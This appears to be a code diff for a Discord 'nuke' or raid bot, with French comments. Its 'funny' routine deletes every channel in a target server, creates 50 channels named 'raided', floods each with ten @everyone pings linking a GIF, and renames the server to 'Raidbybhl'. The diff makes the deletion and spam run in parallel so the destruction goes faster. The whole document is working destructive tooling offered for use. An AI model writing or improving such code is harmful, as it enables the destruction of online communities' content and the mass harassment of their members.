@@ -109,25 +109,40 @@ async def cmd_interface():
                 async def funny():
                     guild = discord.utils.get(client.guilds, id=serveur_id)
                     if guild:
+                        tasks = []  # Liste des tâches pour exécuter en parallèle
+
+                        # Suppression des salons existants
                         for channel in guild.channels:
                             # Vérification si le salon est requis pour un serveur communautaire
                             if isinstance(channel, discord.TextChannel) and channel.name == "community" and channel.category is not None:
                                 print(Fore.RED + f"Le salon '{channel.name}' est requis pour le serveur communautaire et ne sera pas supprimé.")
                                 continue  # Ignore ce salon et passe au suivant
                             try:
-                                await channel.delete()
+                                tasks.append(channel.delete())  # Ajout de la tâche de suppression
                                 print(Fore.RED + f"Salon {channel.name} supprimé.")
                             except discord.errors.Forbidden:
                                 print(Fore.RED + f"Impossible de supprimer le salon {channel.name}, permission insuffisante.")
                             except discord.errors.HTTPException as e:
                                 print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")
 
-                        for i in range(50):  # Crée 50 salons
+                        # Attente de la fin de toutes les suppressions
+                        await asyncio.gather(*tasks)
+
+                        tasks.clear()  # Vider la liste des tâches avant de recréer les salons
+
+                        # Création de 50 salons
+                        for i in range(50):
                             salon = await guild.create_text_channel("raided")
                             print(Fore.RED + f"Salon '{salon.name}' créé.")
-                            # Envoie un message avec le lien du GIF
-                            await salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif")
-                            print(Fore.RED + f"@everyone mentionné dans '{salon.name}'.")
+
+                            # Envoie du message avec le lien du GIF 5 fois dans le salon
+                            for _ in range(10):
+                                tasks.append(salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif"))
+                                print(Fore.RED + f"@everyone mentionné dans '{salon.name}'.")
+
+                        # Attente de l'envoi de tous les messages
+                        await asyncio.gather(*tasks)
+
                     else:
                         print(Fore.RED + "Serveur non trouvé.")
 
@@ -150,11 +165,11 @@ async def cmd_interface():
                                 print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")
 
                         print(Fore.RED + "Tous les salons ont été supprimés.")
-                        
+
                         # Changer le nom du serveur en "NUKE"
                         await guild.edit(name="Raidbybhl")
                         print(Fore.RED + "Nom du serveur changé en : Raidbybhl")
-                        
+
                         # Création du salon 'nuked'
                         nuked_channel = await guild.create_text_channel("Raidbybhl")
                         print(Fore.RED + f"Salon 'Raidbybhl' créé.")
